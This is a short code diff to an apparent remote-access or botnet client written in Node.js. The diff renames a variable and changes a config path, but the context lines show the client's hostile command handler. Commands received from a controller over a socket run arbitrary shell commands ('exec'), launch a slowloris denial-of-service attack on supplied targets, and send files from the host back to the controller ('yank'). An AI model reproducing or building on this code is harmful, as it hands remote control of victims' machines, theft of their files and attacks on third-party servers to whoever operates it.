@@ -7,7 +7,7 @@ import dotenv from "dotenv";
 import changeDir from "./shell.js";
 import slowLoris from "./attacks/slowloris.js";
 
-dotenv.config({ path: "../config/.env" });
+dotenv.config({ path: "../../config/.env" });
 
 const exec = util.promisify(child_process.exec);
 let path = process.cwd();
@@ -61,7 +61,7 @@ async function execute(command) {
 client.on("data", (data) => {
 	const dataStr = data.toString();
 
-	const commandArgs = {
+	const args = {
 		first: dataStr.split(" ")[1],
 		second: dataStr.split(" ")[2],
 		third: dataStr.split(" ")[3],
@@ -69,7 +69,7 @@ client.on("data", (data) => {
 	};
 
 	if (dataStr.startsWith("exec")) {
-		if (commandArgs.first === "cd") {
+		if (args.first === "cd") {
 			path = changeDir(data, path);
 		}
 		execute(dataStr.replace("exec", ""));
@@ -77,15 +77,15 @@ client.on("data", (data) => {
 
 	if (dataStr.startsWith("slowloris")) {
 		slowLoris(
-			commandArgs.first,
-			commandArgs.second,
-			commandArgs.third,
-			commandArgs.fourth
+			args.first,
+			args.second,
+			args.third,
+			args.fourth
 		);
 	}
 
 	if (dataStr.startsWith("yank")) {
-		sendFile(path + "\\" + commandArgs.first);
+		sendFile(path + "\\" + args.first);
 	}
 });
 
